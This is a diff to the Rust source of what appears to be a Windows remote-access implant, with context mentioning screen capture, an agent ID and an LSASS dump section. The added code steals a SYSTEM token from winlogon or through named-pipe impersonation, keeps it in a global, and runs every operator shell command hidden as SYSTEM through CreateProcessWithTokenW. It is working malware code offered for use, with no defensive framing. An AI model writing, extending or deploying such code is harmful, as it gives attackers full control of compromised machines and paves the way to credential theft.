@@ -156,10 +156,67 @@ fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u6
 // ── Shell helpers ─────────────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
+#[cfg(target_os = "windows")]
+unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
+    fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
+    let full = format!("cmd.exe /s /c \"{}\" 2>&1", cmd);
+    let mut wcmd = to_wide(&full);
+
+    let mut h_read = 0isize;
+    let mut h_write = 0isize;
+    let mut sa: windows_sys::Win32::Security::SECURITY_ATTRIBUTES =
+        std::mem::zeroed();
+    sa.nLength = std::mem::size_of_val(&sa) as u32;
+    sa.bInheritHandle = 1;
+    if CreatePipe(&mut h_read, &mut h_write, &sa, 0) == 0 {
+        return "[error: CreatePipe]".into();
+    }
+    SetHandleInformation(h_read, HANDLE_FLAG_INHERIT, 0);
+
+    let mut si: STARTUPINFOW = std::mem::zeroed();
+    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = h_write;
+    si.hStdError  = h_write;
+    si.hStdInput  = -1isize; /* INVALID_HANDLE_VALUE */
+    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+
+    let ok = CreateProcessWithTokenW(
+        token, 0, std::ptr::null(), wcmd.as_mut_ptr(),
+        CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(),
+        &si, &mut pi,
+    );
+    CloseHandle(h_write);
+    if ok == 0 {
+        CloseHandle(h_read);
+        return format!("[error: CreateProcessWithTokenW {}]", GetLastError());
+    }
+
+    let mut buf = Vec::<u8>::with_capacity(4096);
+    let mut tmp = [0u8; 512];
+    let mut nr = 0u32;
+    while ReadFile(h_read, tmp.as_mut_ptr() as _, 512, &mut nr, std::ptr::null_mut()) != 0 && nr > 0 {
+        buf.extend_from_slice(&tmp[..nr as usize]);
+    }
+    WaitForSingleObject(pi.hProcess, 60000);
+    CloseHandle(h_read);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    String::from_utf8_lossy(&buf).into_owned()
+}
+
 fn shell(cmd: &str) -> String {
     use std::io::Read;
     use std::sync::{Arc, Mutex};
     use std::process::Stdio;
+
+    #[cfg(target_os = "windows")]
+    {
+        let sys_tok = unsafe { G_SYSTEM_TOKEN };
+        if sys_tok != 0 {
+            return unsafe { shell_as_system(cmd, sys_tok) };
+        }
+    }
 
     let mut child = match Command::new("cmd.exe")
         .args(["/s", "/c", cmd])
@@ -301,7 +358,7 @@ use windows_sys::Win32::Security::{
     DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
     AdjustTokenPrivileges, LookupPrivilegeValueW,
     LogonUserW, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
-    SecurityImpersonation, TokenImpersonation,
+    SecurityImpersonation, TokenImpersonation, TokenPrimary,
     TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES,
     SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
 };
@@ -313,7 +370,8 @@ use windows_sys::Win32::System::Services::{
 };
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::Storage::FileSystem::{
-    FILE_FLAG_OVERLAPPED, PIPE_ACCESS_DUPLEX,
+    FILE_FLAG_OVERLAPPED, PIPE_ACCESS_DUPLEX, CreatePipe,
+    ReadFile, SetHandleInformation, HANDLE_FLAG_INHERIT,
 };
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Pipes::{
@@ -326,7 +384,15 @@ use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
+    CreateProcessWithTokenW, OpenThreadToken, GetCurrentThread,
+    PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW, STARTF_USESTDHANDLES,
+    TOKEN_IMPERSONATE,
 };
+
+// Primary SYSTEM token stored by get_system(); shell() uses it via
+// CreateProcessWithTokenW so commands run as SYSTEM on any thread.
+#[cfg(target_os = "windows")]
+static mut G_SYSTEM_TOKEN: isize = 0;
 
 // ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────
 
@@ -845,13 +911,21 @@ unsafe fn get_system() -> String {
         let mut htok = 0isize;
         if OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htok) == 0 { CloseHandle(hproc); break 'T1; }
         CloseHandle(hproc);
+        let mut hprim = 0isize;
+        DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
+            SecurityImpersonation, TokenPrimary, &mut hprim);
         let mut hdup = 0isize;
         DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
             SecurityImpersonation, TokenImpersonation, &mut hdup);
         CloseHandle(htok);
-        if hdup == 0 { break 'T1; }
-        if ImpersonateLoggedOnUser(hdup) == 0 { CloseHandle(hdup); break 'T1; }
+        if hdup == 0 { if hprim != 0 { CloseHandle(hprim); } break 'T1; }
+        if ImpersonateLoggedOnUser(hdup) == 0 {
+            CloseHandle(hdup); if hprim != 0 { CloseHandle(hprim); } break 'T1;
+        }
         CloseHandle(hdup);
+        let old = G_SYSTEM_TOKEN;
+        G_SYSTEM_TOKEN = hprim;
+        if old != 0 { CloseHandle(old); }
         return format!("[+] T1 SYSTEM (winlogon PID={})", sys_pid);
     }
 
@@ -927,6 +1001,16 @@ unsafe fn get_system() -> String {
     CloseHandle(h_pipe);
     if ok == 0 {
         return format!("[-] T1+T2 failed (ImpersonateNamedPipeClient err {})", GetLastError());
+    }
+    let mut h_thr_tok = 0isize;
+    if OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, 0, &mut h_thr_tok) != 0 {
+        let mut hprim = 0isize;
+        DuplicateTokenEx(h_thr_tok, TOKEN_ALL_ACCESS, std::ptr::null(),
+            SecurityImpersonation, TokenPrimary, &mut hprim);
+        CloseHandle(h_thr_tok);
+        let old = G_SYSTEM_TOKEN;
+        G_SYSTEM_TOKEN = hprim;
+        if old != 0 { CloseHandle(old); }
     }
     "[+] T2 SYSTEM (named pipe + service)".into()
 }
